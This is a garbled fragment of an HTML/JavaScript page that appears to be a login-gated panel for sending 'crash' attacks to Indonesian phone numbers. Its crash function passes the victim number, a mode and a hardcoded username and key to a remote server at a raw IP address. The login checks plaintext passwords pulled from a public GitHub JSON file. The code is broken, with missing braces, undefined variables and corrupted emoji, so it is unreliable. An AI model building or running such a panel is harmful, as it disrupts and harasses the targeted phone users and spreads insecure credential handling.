<!DOCTYPE html>

  <style>

    body {
      font-family: Arial, sans-serif;
      background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
      background-size: cover;
      color: white;
      height: 100vh;

    .center-screen {

    .container {
      background: rgba(15, 15, 15, 0.85);
      padding: 30px 20px 60px;

      text-align: center;
      width: 90%;
      max-width: 400px;
      position: relative;
    }

    .input {
      display: block;
      width: 100%;
      margin: 15px 0;
      padding: 10px;
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 6px;
      color: white;
      font-size: 16px;
    }

    button {
      padding: 10px 20px;
      margin: 10px 5px;
      background: #2b3f5c;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background: #3f3f3f;
    }

    .hidden {
      display: none;
    }

    .logout-global {
      position: fixed;
      top: 15px;
      right: 15px;
      z-index: 999;
    }

    .global-buttons {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 10px;
      z-index: 998;
    }

    .marquee-wrapper {
      position: absolute;
      bottom: 15px;
      left: 0;
      width: 100%;
      text-align: center;
      font-weight: bold;
      font-size: 14px;
      color: #ddd;
    }

    .success-text {
      font-size: 18px;
      line-height: 1.8;
    }
  </style>
</head>
<body>

<!-- Logout Button -->

<script>
  const RAW_USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/Database/main/users.json";

  async function login() {
    const u = document.getElementById("username").value.trim();
    const p = document.getElementById("password").value.trim();
    const err = document.getElementById("errorMsg");

    try {
      const res = await fetch(RAW_USERS_URL);
      const users = await res.json();
      const found = users.find(user => user.username === u && user.password === p);

      if (found) {
        localStorage.setItem("loggedIn", "true");
        showPage("menuPage");
        document.getElementById("logoutBtn").classList.remove("hidden");
        document.getElementById("globalLinks").classList.remove("hidden");
      } else {
        err.textContent = "‚ùå Username atau password salah!";
      }
    } catch (e) {
      err.textContent = "‚ùó Gagal ambil data dari GitHub!";
    }
  }

  function logout() {
    localStorage.removeItem("loggedIn");
    location.reload();
  }

  async function crash(type) {

    if (!target.startsWith("62")) return alert("‚ùó Nomor harus diawali 62xxxx");

    const bulan = today.toLocaleString('id-ID', { month: 'long' });
    const tahun = today.getFullYear();
    const tanggalLengkap = `${tanggal} ${bulan} ${tahun}`;

    try {
      const res = await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);

      } else {

      }
    } catch (e) {
      alert("‚ùå Gagal konek ke server bug!");
    }
  }

  function showPage(id) {

  }

  window.onload = () => {

      showPage("menuPage");
